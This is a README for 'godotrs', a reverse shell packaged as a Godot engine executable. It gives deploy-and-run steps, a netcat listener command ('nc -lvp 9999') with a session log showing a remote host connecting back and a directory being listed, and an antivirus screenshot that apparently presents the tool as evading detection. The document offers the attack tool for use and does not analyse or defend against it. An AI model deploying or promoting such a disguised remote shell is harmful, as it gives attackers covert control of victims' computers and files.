# godotrs

portable godot based reverse shell

https://godotengine.org/download/

**Usage**

deploy & run:
- godotrs.exe
- godotrs.pck

```
root@kali:~# nc -lvp 9999
listening on [any] 9999 ...
192.168.1.71: inverse host lookup failed: Unknown host
connect to [192.168.1.101] from (UNKNOWN) [192.168.1.71] 58913
ls -lha
>[total 107664
drwxr-xr-x  14 WOPR  staff   448B Dec 17 09:15 .
drwxr-xr-x@  5 WOPR  staff   160B Dec 17 06:59 ..
drwxr-xr-x   4 WOPR  staff   128B Dec 17 06:59 .import
-rw-r--r--   1 WOPR  staff   500B Dec 17 08:47 Popup.gd
-rw-r--r--   1 WOPR  staff   191B Dec 17 09:15 Popup.tscn
-rw-r--r--   1 WOPR  staff   163B Dec 17 09:15 default_env.tres
-rw-r--r--   1 WOPR  staff   774B Dec 17 09:12 export_presets.cfg
-rw-r--r--   1 WOPR  staff   9.6M Dec 17 09:06 godotrs.appx
-rw-r--r--@  1 WOPR  staff    15M Dec 17 09:02 godotrs.dmg
-rw-r--r--   1 WOPR  staff    27M Dec 17 09:12 godotrs.exe
-rw-r--r--   1 WOPR  staff    18K Dec 17 09:12 godotrs.pck
-rw-r--r--@  1 WOPR  staff   7.4K Dec 17 06:59 icon.png
-rw-r--r--   1 WOPR  staff   640B Dec 17 06:59 icon.png.import
-rw-r--r--@  1 WOPR  staff   736B Dec 17 09:15 project.godot
```

**AV**

<img width="1401" alt="Screenshot 2019-12-17 at 09 13 29" src="https://user-images.githubusercontent.com/56988989/70982133-5d4dce80-20ae-11ea-84ca-e7b76b4847c7.png">

**Limitations**
- gfx support required
